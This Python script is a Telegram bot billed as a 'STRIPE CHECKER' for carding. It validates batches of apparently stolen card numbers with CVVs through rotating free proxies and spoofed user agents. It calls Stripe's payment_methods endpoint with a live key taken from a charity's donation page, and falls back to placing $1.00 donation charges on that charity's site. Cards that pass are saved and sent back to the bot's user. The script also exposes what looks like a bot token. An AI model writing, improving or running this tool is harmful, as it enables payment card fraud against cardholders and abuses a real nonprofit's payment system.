import httpx
import random
import time
import json
import uuid
import requests
import re
import asyncio
import logging
import os
from fake_useragent import UserAgent
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import Message, FSInputFile
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from dotenv import load_dotenv
import threading

load_dotenv()
API_TOKEN = os.getenv("8505905087:AAFNlk5FBJOXMJfxxAlE2xwC5IMMOb7M6DE")
bot = Bot(token=API_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# Auto Proxy System
PROXIES = []
ua = UserAgent()
proxy_lock = threading.Lock()

async def scrape_proxies():
    """Auto scrape fresh proxies every 5min"""
    global PROXIES
    try:
        print("🔄 Scraping fresh proxies...")
        
        # ProxyScrape
        resp1 = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all", timeout=10)
        proxies1 = [f"http://{line.strip()}" for line in resp1.text.strip().split('\n') if line.strip()]
        
        # FreeProxyList
        resp2 = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", timeout=10)
        proxies2 = [f"http://{line.strip()}" for line in resp2.text.strip().split('\n') if line.strip()]
        
        # Combine + shuffle
        all_proxies = proxies1[:50] + proxies2[:50]
        random.shuffle(all_proxies)
        PROXIES.extend(all_proxies)
        
        print(f"✅ Loaded {len(PROXIES)} proxies")
        return len(PROXIES)
    except:
        print("❌ Proxy scrape failed")
        return 0

def get_working_proxy():
    """Get random working proxy"""
    with proxy_lock:
        if not PROXIES:
            return None
        proxy = random.choice(PROXIES)
        PROXIES.remove(proxy)  # Remove used proxy
        if len(PROXIES) < 10:
            asyncio.create_task(scrape_proxies())
        return {"http": proxy, "https": proxy}

async def test_proxy(proxy):
    """Quick proxy test"""
    try:
        resp = requests.get("http://httpbin.org/ip", proxies=proxy, timeout=6)
        return resp.status_code == 200
    except:
        return False

async def create_payment_method(fullz):
    """✅ FIXED 403 ERROR VERSION"""
    max_retries = 5
    for attempt in range(max_retries):
        proxy = get_working_proxy()
        if proxy:
            try:
                if not await test_proxy(proxy):
                    print("❌ Bad proxy, skipping")
                    continue
            except:
                continue
                
        session = requests.Session()
        if proxy:
            session.proxies.update(proxy)
            session.headers.update({'User-Agent': ua.random})
        
        try:
            cc, mes, ano, cvv = fullz.split("|")
            
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.5',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://acefonline.org',
                'referer': 'https://acefonline.org/donate/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }

            data = {
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_month]': mes,
                'card[exp_year]': ano,
                'key': 'pk_live_51OmjsXJ2oe8RRzALRXjWkYpWBLAGWpJws2lCXnwBQuYFDoV9y1ZDS7MEuRYarKvhKYb9Rj7mlJOyOOUzP5WNARMD0095CooLuR',
            }

            print(f"🔄 PM #{attempt+1}: {cc[:8]}**** | Proxy: {'YES' if proxy else 'NO'}")
            
            response = session.post(
                'https://api.stripe.com/v1/payment_methods', 
                headers=headers, 
                data=data, 
                timeout=20
            )
            
            print(f"📡 {response.status_code} | {response.text[:150]}")
            
            if response.status_code == 200:
                try:
                    resp_json = response.json()
                    if resp_json.get('id'):
                        pm_id = resp_json['id']
                        print(f"✅ PM SUCCESS: {pm_id}")
                        return f"✅ PM LIVE | {pm_id}"
                except:
                    pass
            
            if response.status_code in [400, 402, 403]:
                charge_result = await direct_charge_acef(cc, mes, ano, cvv, session)
                if charge_result == "✅ LIVE":
                    return "✅ CVV LIVE 🔥"
            
            if response.status_code == 429:
                print("⏳ Rate limit, waiting...")
                await asyncio.sleep(3)
                continue
                
        except Exception as e:
            print(f"💥 Error: {str(e)[:100]}")
        finally:
            session.close()
            await asyncio.sleep(1.2)
    
    return "❌ DEAD"

async def direct_charge_acef(cc, mes, ano, cvv, session):
    """Direct acef charge fallback"""
    try:
        headers = {
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://acefonline.org',
            'referer': 'https://acefonline.org/donate/',
            'user-agent': ua.random,
            'x-requested-with': 'XMLHttpRequest',
        }
        
        resp1 = session.get('https://acefonline.org/donate/', timeout=15)
        nonce_match = re.search(r"give_form_hash['\"]\s*:\s*['\"]([^'\"]+)", resp1.text)
        if not nonce_match:
            return "❌ NO NONCE"
            
        nonce = nonce_match.group(1)
        
        data2 = {
            'give-action': 'process-donation',
            'give_form_hash': nonce,
            'give_amount': '1.00',
            'give_amount_other': '1.00',
            'give_cc_number': cc,
            'give_cc_expiration_month': mes,
            'give_cc_expiration_year': ano,
            'give_cc_cvc': cvv,
            'give_billing_address': '123 Test St',
            'give_billing_city': 'NY',
            'give_billing_state': 'NY',
            'give_billing_zip': '10001',
            'give_email': "test%d@gmail.com" % random.randint(1000,9999),
        }
        
        resp2 = session.post(
            'https://acefonline.org/wp-admin/admin-ajax.php', 
            headers=headers, 
            data=data2, 
            timeout=25
        )
        
        print(f"💳 ACEF: {resp2.status_code} | {resp2.text[:100]}")
        
        if "success" in resp2.text.lower() or "thank" in resp2.text.lower():
            return "✅ LIVE"
        elif "declined" in resp2.text.lower():
            return "❌ DIE"
        else:
            return "⚠️ UNKNOWN"
            
    except:
        return "⚠️ FAIL"

class CheckStates(StatesGroup):
    waiting_cc = State()

# Auto proxy refresh task
async def proxy_refresh_loop():
    while True:
        await scrape_proxies()
        await asyncio.sleep(300)

# Bot Commands
@dp.message(Command("start"))
async def start_cmd(message: Message):
    await message.answer(
        "🚀 <b>STRIPE CHECKER</b>\n\n"
        "✅ Proxy testing\n✅ PM + ACEF fallback\n✅ 403 ERROR FIXED\n\n"
        "📤 <code>4111111111111111|12|34|123</code>\n"
        "📋 <b>/check</b> Bulk | <b>/lives</b>\n\n"
        "<i>Console shows debug!</i>", 
        parse_mode="HTML"
    )

@dp.message(Command("check"))
async def bulk_check(message: Message, state: FSMContext):
    await message.answer("📋 Send CCs (1 per line, max 30)")
    await state.set_state(CheckStates.waiting_cc)

@dp.message(CheckStates.waiting_cc)
async def process_bulk(message: Message, state: FSMContext):
    lines = message.text.strip().split('\n')
    ccs = [line.strip() for line in lines if '|' in line and len(line.split('|')) == 4][:30]
    
    if not ccs:
        await message.answer("❌ No valid CCs!")
        await state.clear()
        return
    
    await message.answer(f"🔄 Checking {len(ccs)} CCs...")
    
    semaphore = asyncio.Semaphore(2)
    results = []
    
    async def check_cc(cc):
        async with semaphore:
            start = time.time()
            result = await create_payment_method(cc)
            elapsed = "%.1f" % (time.time()-start)
            return "%s | %s | %ss" % (cc, result, elapsed)
    
    for i, cc in enumerate(ccs):
        result = await check_cc(cc)
        results.append(result)
        await message.answer("📊 [%d/%d] %s" % (i+1, len(ccs), result), parse_mode="HTML")
        await asyncio.sleep(2)
    
    lives = [r for r in results if "LIVE" in r or "✅" in r]
    if lives:
        with open("lives.txt", "a", encoding="utf-8") as f:
            f.write("\n".join(lives) + "\n\n")
        await message.answer("💾 Saved %d lives!" % len(lives))
    
    await state.clear()

@dp.message(Command("lives"))
async def send_lives(message: Message):
    if os.path.exists("lives.txt") and os.path.getsize("lives.txt") > 0:
        await message.answer_document(FSInputFile("lives.txt"))
    else:
        await message.answer("📁 No lives yet")

@dp.message(Command("status"))
async def status(message: Message):
    await message.answer("🌐 Proxies: %d" % len(PROXIES))

@dp.message()
async def single_check(message: Message):
    text = message.text.strip()
    if '|' in text and len(text.split('|')) == 4:
        await message.answer("🔄 Testing with proxy...")
        start = time.time()
        result = await create_payment_method(text)
        elapsed = "%.1f" % (time.time()-start)
        final_result = "<b>%s</b>\n%s\n⏱️ %ss" % (text, result, elapsed)
        await message.answer(final_result, parse_mode="HTML")
        
        if "LIVE" in result or "✅" in result:
            with open("lives.txt", "a") as f:
                f.write("%s | %s | %ss\n" % (text, result, elapsed))
    else:
        await message.answer("❌ <code>4111111111111111|12|34|123</code>", parse_mode="HTML")

async def main():
    print("🚀 ANTI-403 BOT STARTING...")
    await scrape_proxies()
    asyncio.create_task(proxy_refresh_loop())
    print("✅ Ready!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
